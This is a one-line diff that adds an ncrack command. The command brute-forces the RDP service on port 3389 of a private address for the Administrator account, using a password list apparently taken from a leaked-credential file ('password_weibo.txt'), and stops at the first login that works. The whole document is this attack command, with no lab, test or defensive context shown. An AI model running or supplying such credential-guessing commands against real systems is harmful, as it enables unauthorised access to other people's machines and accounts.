@@ -1,0 +1,1 @@
+ ncrack -vv --user Administrator  -P /xfh/db/passwd/password_weibo.txt 192.168.1.168:3389,CL=1 -f
